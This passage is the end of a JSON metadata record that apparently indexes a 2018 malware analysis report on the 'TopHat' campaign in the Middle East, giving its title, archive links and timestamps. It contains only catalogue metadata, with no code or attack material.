        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-01-26 - The TopHat Campaign- Attacks Within The Middle East Region Using Popular Third-Party Services.pdf"
    ],
    "report_names": [
        "2018-01-26 - The TopHat Campaign- Attacks Within The Middle East Region Using Popular Third-Party Services.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535744,
    "ts_updated_at": 1743041166,
    "ts_creation_date": 1653704031,
    "ts_modification_date": 1653704031,
    "files": {
        "pdf": "https://archive.orkl.eu/efaa532e0ae91c06491ff11f14e7e65dfaf17ab9.pdf",
        "text": "https://archive.orkl.eu/efaa532e0ae91c06491ff11f14e7e65dfaf17ab9.txt",
        "img": "https://archive.orkl.eu/efaa532e0ae91c06491ff11f14e7e65dfaf17ab9.jpg"
    }
}